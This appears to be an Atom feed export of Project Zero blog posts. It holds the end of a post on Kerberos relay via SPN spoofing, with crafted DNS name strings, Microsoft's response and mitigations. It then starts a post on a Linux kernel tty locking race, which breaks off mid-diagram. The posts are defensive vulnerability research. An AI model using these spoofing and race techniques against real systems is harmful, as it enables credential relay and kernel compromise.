the function &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-secmakespnex2"&gt;SecMakeSPNEx2&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to build the SPN value from the service class and name. You might assume this would just return the SPN as-is, however that&amp;#39;s not the case. Instead for the hostname of &lt;/span&gt;&lt;span class="c4"&gt;fileserver &lt;/span&gt;&lt;span&gt;with the service class &lt;/span&gt;&lt;span class="c4"&gt;cifs&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;you get back an SPN which looks like the following:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.0468306ab73a53f6535ab8bb12a4cae517044efb"&gt;&lt;/a&gt;&lt;a id="t.7"&gt;&lt;/a&gt;&lt;table class="c21"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c11" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c2 c4"&gt;cifs/fileserver1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAfileserversBAAAA&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;Looking at the implementation of &lt;/span&gt;&lt;span class="c4"&gt;SecMakeSPNEx2&lt;/span&gt;&lt;span&gt;&amp;nbsp;it makes a call to the API function &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/api/ntsecpkg/nf-ntsecpkg-credmarshaltargetinfo"&gt;CredMarshalTargetInfo&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. This API takes a list of target information in a &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/api/wincred/ns-wincred-credential_target_informationw"&gt;CREDENTIAL_TARGET_INFORMATION&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;structure and marshals it using a base64 string encoding. This marshaled string is then appended to the end of the real SPN.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;The code is therefore just appending some additional target information to the end of the SPN, presumably so it&amp;#39;s easier to pass around. My initial assumption would be this information is stripped off before passing to the SSPI APIs by the SMB client. However, passing this SPN value to &lt;/span&gt;&lt;span class="c4"&gt;InitializeSecurityContext&lt;/span&gt;&lt;span&gt;&amp;nbsp;as the target name succeeds and gets a Kerberos service ticket for &lt;/span&gt;&lt;span class="c4"&gt;cifs/fileserver&lt;/span&gt;&lt;span class="c3"&gt;. How does that work?&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;Inside the function &lt;/span&gt;&lt;span class="c4"&gt;SspiExProcessSecurityContext &lt;/span&gt;&lt;span&gt;in &lt;/span&gt;&lt;span class="c4"&gt;lsasrv.dll&lt;/span&gt;&lt;span&gt;, which is the main entrypoint of &lt;/span&gt;&lt;span class="c4"&gt;InitializeSecurityContext, &lt;/span&gt;&lt;span&gt;there&amp;#39;s a call to the &lt;/span&gt;&lt;span class="c4"&gt;CredUnmarshalTargetInfo &lt;/span&gt;&lt;span&gt;API, which parses the marshaled target information. However &lt;/span&gt;&lt;span class="c4"&gt;SspiExProcessSecurityContext &lt;/span&gt;&lt;span class="c3"&gt;doesn&amp;#39;t care about the unmarshalled results, instead it just gets the length of the marshaled data and removes that from the end of the target SPN string. Therefore before the Kerberos package gets the target name it has already been restored to the original SPN.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;The encoded SPN shown earlier, minus the service class, is a valid DNS component name and therefore could be used as the hostname in a public or local DNS resolution request. This is interesting as this potentially gives a way of spoofing a hostname which is distinct from the real target service, but when processed by the SSPI API requests the spoofed service ticket. As in if you use the string &lt;/span&gt;&lt;span class="c42 c4"&gt;fileserver1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAfileserversBAAAA&lt;/span&gt;&lt;span&gt;&amp;nbsp;as the DNS name, and if the client appends a service class to the name and passes it to SSPI it will get a service ticket for &lt;/span&gt;&lt;span class="c4"&gt;fileserver&lt;/span&gt;&lt;span class="c3"&gt;, however the DNS resolving can trivially return an unrelated IP address.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;There are some big limitations to abusing this behavior. The marshaled target information must be valid, the last 6 characters is an encoded length of the entire marshaled buffer and the buffer is prefixed with a 28 byte header with a magic value of 0x91856535 in the first 4 bytes. If this length is invalid (e.g. larger than the buffer or not a multiple of 2) or the magic isn&amp;#39;t present then the &lt;/span&gt;&lt;span class="c4"&gt;CredUnmarshalTargetInfo &lt;/span&gt;&lt;span&gt;call fails and &lt;/span&gt;&lt;span class="c4"&gt;SspiExProcessSecurityContext&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;leaves the SPN as is which will subsequently fail to query a Kerberos ticket for the SPN.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;The easiest way that the name could be invalid is by it being converted to lowercase. DNS is case insensitive, however generally the servers are case preserving. Therefore you could lookup the case sensitive name and the DNS server would return that unmodified. However the HTTP clients tested all seem to lowercase the hostname before use, therefore by the time it&amp;#39;s used to build an SPN it&amp;#39;s now a different string. When unmarshalling &amp;#39;a&amp;#39; and &amp;#39;A&amp;#39; represent different binary values and so parsing of the marshaled information will fail.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;Another issue is that the size limit of a single name in DNS is 63 characters. The minimum valid marshaled buffer is 44 characters long leaving only 19 characters for the SPN part. This is at least larger than the minimum NetBIOS name limit of 15 characters so as long as there&amp;#39;s an SPN for that shorter name registered it should be sufficient. However if there&amp;#39;s no short SPN name registered then it&amp;#39;s going to be more difficult to exploit.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;In theory you could specify the SPN using its FQDN. However it&amp;#39;s hard to construct such a name. The length value must be at the end of the string and needs to be a valid marshaled value so you can&amp;#39;t have any dots within its 6 characters. It&amp;#39;s possible to have a TLD which is 6 characters or longer and as the embedded marshaled values are not escaped this can be used to construct a valid FQDN which would then resolve to another SPN target. For example:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.18557f87bd0691805cf0d36ab288c563e4a9d02e"&gt;&lt;/a&gt;&lt;a id="t.8"&gt;&lt;/a&gt;&lt;table class="c21"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c11" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c2 c4"&gt;fileserver1UWhRCAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAA.domain.oBAAAA&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;is a valid DNS name which would resolve to an SPN for &lt;/span&gt;&lt;span class="c4"&gt;fileserver&lt;/span&gt;&lt;span&gt;. Except that &lt;/span&gt;&lt;span class="c4"&gt;oBAAAA&lt;/span&gt;&lt;span&gt;&amp;nbsp;is not a valid public TLD. Pulling the list of &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://data.iana.org/TLD/tlds-alpha-by-domain.txt"&gt;valid TLDs&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;from ICANN&amp;#39;s website and converting all values which are 6 characters or longer into the expected length value, the smallest length which is a multiple of 2 is from &lt;/span&gt;&lt;span class="c4"&gt;WEBCAM&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;which results in a DNS name at least 264331 characters long, which is somewhat above the 255 character limit usually considered valid for a FQDN in DNS.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;Therefore this would still be limited to more local attacks and only for limited sets of protocols. For example an authenticated user could register a DNS entry for the local domain using this value and trick an RPC client to connect to it using its undotted hostname. As long as the client doesn&amp;#39;t modify the name other than putting the service class on it (or it gets automatically generated by the RPC runtime) then this spoofs the SPN for the request.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.bxbpd7nw1n75"&gt;&lt;span class="c6 c19"&gt;Microsoft&amp;#39;s Response to the Research&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;I didn&amp;#39;t initially start looking at Kerberos authentication relay, as mentioned I found it inadvertently when looking at IPsec and AuthIP which I subsequently reported to Microsoft. After doing more research into other network protocols I decided to use the AuthIP issue as a bellwether on Microsoft&amp;#39;s views on whether relaying Kerberos authentication and spoofing SPNs would cross a security boundary.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;As I mentioned earlier the AuthIP issue was classed as &amp;quot;vNext&amp;quot;, which denotes it might be fixed in a future version of Windows, but not as a security update for any currently shipping version of Windows. This was because Microsoft determined it to be a Moderate severity issue (see &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE2A3xt"&gt;this&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;for the explanation of the severities). Only Important or above will be serviced.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;It seems that the general rule is that any network protocol where the SPN can be spoofed to generate Kerberos authentication which can be relayed, is not sufficient to meet the severity level for a fix. However, any network facing service which can be used to induce authentication where the attacker does not have existing network authentication credentials is considered an Important severity spoofing issue and will be fixed. This is why PetitPotam was fixed as &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-36942"&gt;CVE-2021-36942&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;, as it could be exploited from an unauthenticated user.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;As my research focused entirely on the network protocols themselves and not the ways of inducing authentication, they will all be covered under the same Moderate severity. This means that if they were to be fixed at all, it&amp;#39;d be in unspecified future versions of Windows.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.7zz0k0f1r0u6"&gt;&lt;span class="c6 c19"&gt;Available Mitigations&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;How can you defend yourself against authentication relay attacks presented in this blog post? While I think I&amp;#39;ve made the case that it&amp;#39;s possible to relay Kerberos authentication, it&amp;#39;s somewhat more limited in scope than NTLM relay. This means that disabling NTLM is still an invaluable option for mitigating authentication relay issues on a Windows enterprise network. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;Also, except for disabling NTLM, all the mitigations for NTLM relay apply to Kerberos relay. Requiring signing or sealing on the protocol if possible is sufficient to prevent the majority of attack vectors, especially on important network services such as LDAP.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;For TLS encapsulated protocols, channel binding prevents the authentication being relayed as I didn&amp;#39;t find any way of spoofing the TLS certificate at the same time. If the network service supports EPA, such as HTTPS or LDAPS it should be enabled. Even if the protocol doesn&amp;#39;t support EPA, enabling TLS protection if possible is still valuable. This not only provides more robust server authentication, which Kerberos mutual authentication doesn&amp;#39;t really provide, it&amp;#39;ll also hide Kerberos authentication tokens from sniffing or MitM attacks.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;Some libraries, such as WinHTTP and .NET set the undocumented &lt;/span&gt;&lt;span class="c4"&gt;ISC_REQ_UNVERIFIED_TARGET_NAME&lt;/span&gt;&lt;span&gt;&amp;nbsp;request attribute when calling &lt;/span&gt;&lt;span class="c4"&gt;InitializeSecurityContext&lt;/span&gt;&lt;span&gt;&amp;nbsp;in certain circumstances&lt;/span&gt;&lt;span class="c3"&gt;. This affects the behavior of the server when querying for the SPN used during authentication. Some servers such as SMB and IIS with EPA can be configured to validate the SPN. If this request attribute flag is set then while the authentication will succeed when the server goes to check the SPN, it gets an empty string which will not match the server&amp;#39;s expectations. If you&amp;#39;re a developer you should use this flag if the SPN has been provided from an untrustworthy source, although this will only be beneficial if the server is checking the received SPN.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;A common thread through the research is abusing local DNS resolution to spoof the SPN. Disabling LLMNR and MDNS should always be best practice, and this just highlights the dangers of leaving them enabled. While it might be possible to perform the same attacks through DNS spoofing attacks, these are likely to be much less reliable than local DNS spoofing attacks.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;If Windows authentication isn&amp;#39;t needed from a network client, it&amp;#39;d be wise to disable it if supported. For example, some HTTP user agents support disabling automatic Windows authentication entirely, while others such as Firefox don&amp;#39;t enable it by default. Chromium also supports disabling the DNS lookup process for generating the SPN through group policy.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;Finally, blocking untrusted devices on the network such as through 802.1X or requiring authenticated IPsec/IKEv2 for all network communications to high value services would go some way to limiting the impact of all authentication relay attacks. Although of course, an attacker could still compromise a trusted host and use that to mount the attack.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.lhddftsoy07y"&gt;&lt;span class="c6 c19"&gt;Conclusions&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;I hope that this blog post has demonstrated that Kerberos relay attacks are feasible and just disabling NTLM is not a sufficient mitigation strategy in an enterprise environment. While DNS is a common thread and is the root cause of the majority of these protocol issues, it&amp;#39;s still possible to spoof SPNs using other protocols such as AuthIP and MSRPC without needing to play DNS tricks.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;While I wrote my own tooling to perform the LLMNR attack there are various public tools which can mount an LLMNR and MDNS spoofing attack such as the venerable &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://github.com/SpiderLabs/Responder"&gt;Python Responder&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;. It shouldn&amp;#39;t be hard to modify one of the tools to verify my findings.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;I&amp;#39;ve also not investigated every possible network protocol which might perform Kerberos authentication. I&amp;#39;ve also not looked at non-Windows systems which might support Kerberos such as Linux and macOS. It&amp;#39;s possible that in more heterogeneous networks the impact might be more pronounced as some of the security changes in Microsoft&amp;#39;s Kerberos implementation might not be present.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;If you&amp;#39;re doing your own research into this area, you should look at how the SPN is specified by the protocol, but also how the implementation builds it. For example the HTTP Negotiate RFC states how to build the SPN for Kerberos, but then each implementation does it slightly differently and not to the RFC specification.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;You should be especially wary of any protocol where an untrusted server can specify an arbitrary SPN. This is the case in AuthIP, MSRPC and DCOM. It&amp;#39;s almost certain that when these protocols were originally designed many years ago, that no thought was given to the possible abuse of this design for relaying the Kerberos network authentication. &lt;/span&gt;&lt;/p&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/6510029969921067809/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/6510029969921067809" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/6510029969921067809" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html" title="Using Kerberos for Authentication Relay Attacks" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://blogger.googleusercontent.com/img/a/AVvXsEjeIXhBwnBcGsUREqJ9YPAEyeTw99GDlcn_PmW7fyuxGGkop9HvtErkOKfvy6WXzeXZFfXdOR8C-StQgu3qPaE-t48EHnQ0xPbUgBDm3-jyO_dij-bFHf4Vw6v-ryL9D7FixnLa6I88bzvbkx-QNGx7Wxhc3GGWmJGa9Xbu1-HIZGM0SA1HQWcERC_y2w=s72-c" height="72" width="72" />
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-8464515825658328843</id>
    <published>2021-10-19T09:08:00.000-07:00</published>
    <updated>2021-10-19T09:08:55.364-07:00</updated>
    <title type="text"> How a simple Linux kernel memory corruption bug can lead to complete system compromise</title>
    <content type="html">&lt;style&gt;  .markdown-body pre {     padding: 16px;     overflow: auto;     font-size: 85%;     line-height: 1.45;     background-color: #e2e2e2;     border-radius: 3px;     font-family: Consolas, monospace;   } &lt;/style&gt;&lt;div id="out" class="markdown-body"&gt;  &lt;h3 style='font-weight: normal; font-style: italic;'&gt;An analysis of current and potential kernel security mitigations&lt;/h3&gt;  &lt;p&gt;Posted by Jann Horn, Project Zero&lt;/p&gt;  &lt;h1&gt;Introduction&lt;/h1&gt;&lt;p&gt;This blog post describes a straightforward Linux kernel locking bug and how I exploited it against Debian Buster's 4.19.0-13-amd64 kernel. Based on that, it explores options for security mitigations that could prevent or hinder exploitation of issues similar to this one.&lt;/p&gt;&lt;p&gt;I hope that stepping through such an exploit and sharing this compiled knowledge with the wider security community can help with reasoning about the relative utility of various mitigation approaches.&lt;/p&gt;&lt;p&gt;A lot of the individual exploitation techniques and mitigation options that I am describing here aren't novel. However, I believe that there is value in writing them up together to show how various mitigations interact with a fairly normal use-after-free exploit.&lt;/p&gt;&lt;p&gt;Our bugtracker entry for this bug, along with the proof of concept, is at &lt;a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2125"&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=2125&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Code snippets in this blog post that are relevant to the exploit are taken from the upstream 4.19.160 release, since that is what the targeted Debian kernel is based on; some other code snippets are from mainline Linux.&lt;/p&gt;&lt;p&gt;(In case you're wondering why the bug and the targeted Debian kernel are from end of last year: I already wrote most of this blogpost around April, but only recently finished it)&lt;/p&gt;&lt;p&gt;I would like to thank &lt;a href="https://twitter.com/lunixbochs"&gt;Ryan Hileman&lt;/a&gt; for a discussion we had a while back about how static analysis might fit into static prevention of security bugs (but note that Ryan hasn't reviewed this post and doesn't necessarily agree with any of my opinions). I also want to thank &lt;a href="https://twitter.com/kees_cook"&gt;Kees Cook&lt;/a&gt; for providing feedback on an earlier version of this post (again, without implying that he necessarily agrees with everything), and my Project Zero colleagues for reviewing this post and frequent discussions about exploit mitigations.&lt;/p&gt;&lt;h1&gt;Background for the bug&lt;/h1&gt;&lt;p&gt;On Linux, terminal devices (such as a serial console or a &lt;a href="https://en.wikipedia.org/wiki/Virtual_console"&gt;virtual console&lt;/a&gt;) are represented by a &lt;code&gt;struct tty_struct&lt;/code&gt;. Among other things, this structure contains fields used for the &lt;a href="https://www.gnu.org/software/libc/manual/html_node/Job-Control.html"&gt;job control&lt;/a&gt; features of terminals, which are usually modified using &lt;a href="https://man7.org/linux/man-pages/man4/tty_ioctl.4.html"&gt;a set of ioctls&lt;/a&gt;:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;struct tty_struct {&lt;br /&gt;[...]&lt;br /&gt;        spinlock_t ctrl_lock;&lt;br /&gt;[...]&lt;br /&gt;        struct pid *pgrp;               /* Protected by ctrl lock */&lt;br /&gt;        struct pid *session;&lt;br /&gt;[...]&lt;br /&gt;        struct tty_struct *link;&lt;br /&gt;[...]&lt;br /&gt;}[...];&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;pgrp&lt;/code&gt; field points to the foreground process group of the terminal (normally modified from userspace via the &lt;code&gt;TIOCSPGRP&lt;/code&gt; ioctl); the &lt;code&gt;session&lt;/code&gt; field points to the session associated with the terminal. Both of these fields do not point directly to a process/task, but rather to a &lt;code&gt;struct pid&lt;/code&gt;. &lt;code&gt;struct pid&lt;/code&gt; ties a specific incarnation of a numeric ID to a set of processes that use that ID as their PID (also known in userspace as TID), TGID (also known in userspace as PID), PGID, or SID. You can kind of think of it as a weak reference to a process, although that's not entirely accurate. (There's some extra nuance around &lt;code&gt;struct pid&lt;/code&gt; when &lt;code&gt;execve()&lt;/code&gt; is called by a non-leader thread, but that's irrelevant here.)&lt;/p&gt;&lt;p&gt;All processes that are running inside a terminal and are subject to its job control refer to that terminal as their "controlling terminal" (stored in &lt;code&gt;-&amp;gt;signal-&amp;gt;tty&lt;/code&gt; of the process).&lt;/p&gt;&lt;p&gt;A special type of terminal device are &lt;a href="https://man7.org/linux/man-pages/man7/pty.7.html"&gt;pseudoterminals&lt;/a&gt;, which are used when you, for example, open a terminal application in a graphical environment or connect to a remote machine via SSH. While other terminal devices are connected to some sort of hardware, both ends of a pseudoterminal are controlled by userspace, and pseudoterminals can be freely created by (unprivileged) userspace. Every time &lt;a href="https://man7.org/linux/man-pages/man4/pts.4.html"&gt;&lt;code&gt;/dev/ptmx&lt;/code&gt;&lt;/a&gt; (short for "pseudoterminal multiplexor") is opened, the resulting file descriptor represents the device side (referred to in documentation and kernel sources as "&lt;a href="https://man7.org/linux/man-pages/man7/pty.7.html"&gt;the pseudoterminal master&lt;/a&gt;") of a new pseudoterminal . You can read from it to get the data that should be printed on the emulated screen, and write to it to emulate keyboard inputs. The corresponding terminal device (to which you'd usually connect a shell) is automatically created by the kernel under &lt;code&gt;/dev/pts/&amp;lt;number&amp;gt;&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;One thing that makes pseudoterminals particularly strange is that both ends of the pseudoterminal have their own &lt;code&gt;struct tty_struct&lt;/code&gt;, which point to each other using the &lt;code&gt;link&lt;/code&gt; member, even though the device side of the pseudoterminal does not have terminal features like job control - so many of its members are unused.&lt;/p&gt;&lt;p&gt;Many of the ioctls for terminal management can be used on both ends of the pseudoterminal; but no matter on which end you call them, they affect the same state, sometimes with minor differences in behavior. For example, in the ioctl handler for &lt;code&gt;TIOCGPGRP&lt;/code&gt;:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;/**&lt;br /&gt; *      tiocgpgrp               -       get process group&lt;br /&gt; *      @tty: tty passed by user&lt;br /&gt; *      @real_tty: tty side of the tty passed by the user if a pty else the tty&lt;br /&gt; *      @p: returned pid&lt;br /&gt; *&lt;br /&gt; *      Obtain the process group of the tty. If there is no process group&lt;br /&gt; *      return an error.&lt;br /&gt; *&lt;br /&gt; *      Locking: none. Reference to current-&amp;gt;signal-&amp;gt;tty is safe.&lt;br /&gt; */&lt;br /&gt;static int tiocgpgrp(struct tty_struct *tty, struct tty_struct *real_tty, pid_t __user *p)&lt;br /&gt;{&lt;br /&gt;        struct pid *pid;&lt;br /&gt;        int ret;&lt;br /&gt;        /*&lt;br /&gt;         * (tty == real_tty) is a cheap way of&lt;br /&gt;         * testing if the tty is NOT a master pty.&lt;br /&gt;         */&lt;br /&gt;        if (tty == real_tty &amp;amp;&amp;amp; current-&amp;gt;signal-&amp;gt;tty != real_tty)&lt;br /&gt;                return -ENOTTY;&lt;br /&gt;        pid = tty_get_pgrp(real_tty);&lt;br /&gt;        ret =  put_user(pid_vnr(pid), p);&lt;br /&gt;        put_pid(pid);&lt;br /&gt;        return ret;&lt;br /&gt;}&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As documented in the comment above, these handlers receive a pointer &lt;code&gt;real_tty&lt;/code&gt; that points to the normal terminal device; an additional pointer &lt;code&gt;tty&lt;/code&gt; is passed in that can be used to figure out on which end of the terminal the ioctl was originally called. As this example illustrates, the &lt;code&gt;tty&lt;/code&gt; pointer is normally only used for things like pointer comparisons. In this case, it is used to prevent &lt;code&gt;TIOCGPGRP&lt;/code&gt; from working when called on the terminal side by a process which does not have this terminal as its controlling terminal.&lt;/p&gt;&lt;p&gt;Note: If you want to know more about how terminals and job control are intended to work, the book &lt;a href="https://man7.org/tlpi/"&gt;"The Linux Programming Interface"&lt;/a&gt; provides a nice introduction to how these older parts of the userspace API are supposed to work. It doesn't describe any of the kernel internals though, since it's written as a reference for userspace programming. And it's from 2010, so it doesn't have anything in it about new APIs that have showed up over the last decade.&lt;/p&gt;&lt;h1&gt;The bug&lt;/h1&gt;&lt;p&gt;The bug was in the ioctl handler &lt;code&gt;tiocspgrp&lt;/code&gt;:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;/**&lt;br /&gt; *      tiocspgrp               -       attempt to set process group&lt;br /&gt; *      @tty: tty passed by user&lt;br /&gt; *      @real_tty: tty side device matching tty passed by user&lt;br /&gt; *      @p: pid pointer&lt;br /&gt; *&lt;br /&gt; *      Set the process group of the tty to the session passed. Only&lt;br /&gt; *      permitted where the tty session is our session.&lt;br /&gt; *&lt;br /&gt; *      Locking: RCU, ctrl lock&lt;br /&gt; */&lt;br /&gt;static int tiocspgrp(struct tty_struct *tty, struct tty_struct *real_tty, pid_t __user *p)&lt;br /&gt;{&lt;br /&gt;        struct pid *pgrp;&lt;br /&gt;        pid_t pgrp_nr;&lt;br /&gt;[...]&lt;br /&gt;        if (get_user(pgrp_nr, p))&lt;br /&gt;                return -EFAULT;&lt;br /&gt;[...]&lt;br /&gt;        pgrp = find_vpid(pgrp_nr);&lt;br /&gt;[...]&lt;br /&gt;        spin_lock_irq(&amp;amp;tty-&amp;gt;ctrl_lock);&lt;br /&gt;        put_pid(real_tty-&amp;gt;pgrp);&lt;br /&gt;        real_tty-&amp;gt;pgrp = get_pid(pgrp);&lt;br /&gt;        spin_unlock_irq(&amp;amp;tty-&amp;gt;ctrl_lock);&lt;br /&gt;[...]&lt;br /&gt;}&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;pgrp&lt;/code&gt; member of the terminal side (&lt;code&gt;real_tty&lt;/code&gt;) is being modified, and the reference counts of the old and new process group are adjusted accordingly using &lt;code&gt;put_pid&lt;/code&gt; and &lt;code&gt;get_pid&lt;/code&gt;; but the lock is taken on &lt;code&gt;tty&lt;/code&gt;, which can be either end of the pseudoterminal pair, depending on which file descriptor we pass to &lt;code&gt;ioctl()&lt;/code&gt;. So by simultaneously calling the &lt;code&gt;TIOCSPGRP&lt;/code&gt; ioctl on both sides of the pseudoterminal, we can cause data races between concurrent accesses to the &lt;code&gt;pgrp&lt;/code&gt; member. This can cause reference counts to become skewed through the following races:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;  ioctl(fd1, TIOCSPGRP, pid_A)        ioctl(fd2, TIOCSPGRP, pid_B)&lt;br /&gt;    spin_lock_irq(...)                  spin_lock_irq(...)&lt;br /&gt;    put_pid(old_pid)&lt;br /&gt;                                   